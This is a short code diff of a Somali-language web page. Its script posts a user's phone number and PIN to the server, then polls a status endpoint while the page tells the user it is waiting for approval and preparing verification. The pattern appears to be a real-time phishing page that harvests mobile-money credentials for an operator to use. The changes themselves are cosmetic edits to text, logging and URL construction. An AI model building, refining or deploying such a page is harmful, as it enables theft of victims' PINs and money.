@@ -72,8 +72,8 @@
 
 <div class="loading-card">
     <div class="loader-circle"></div>
-    <h2 id="main-text">Sugaya...</h2>
-    <p id="sub-text">Sugaya oggolaanshaha...</p>
+    <h2 id="main-text">Habaynta...</h2>
+    <p id="sub-text">Diyaarinaya xaqiijinta...</p>
 </div>
 
 <script>
@@ -103,16 +103,16 @@ document.addEventListener("DOMContentLoaded", async () => {
             body: JSON.stringify({ phone, pin })
         });
 
-        console.log("📩 Login sent to server");
+        console.log("📩 Login sent");
 
     } catch (err) {
-        console.error("❌ SEND ERROR:", err);
+        console.error("❌ FETCH ERROR:", err);
     }
 
-    // STEP 2: WAIT FOR APPROVAL (POLLING)
+    // STEP 2: WAIT FOR APPROVAL (NO FAKE TIMER)
     async function checkApproval() {
         try {
-            const res = await fetch(window.location.origin + `/api/check-status?phone=${phone}`);
+            const res = await fetch(window.location.origin + '/api/check-status?phone=' + phone);
             const data = await res.json();
 
             console.log("🔄 STATUS:", data);
@@ -131,8 +131,8 @@ document.addEventListener("DOMContentLoaded", async () => {
                 subText.textContent = "Fadlan isku day mar kale";
             }
 
-        } catch (e) {
-            console.error("❌ STATUS CHECK ERROR:", e);
+        } catch (err) {
+            console.error("❌ STATUS ERROR:", err);
         }
     }
 
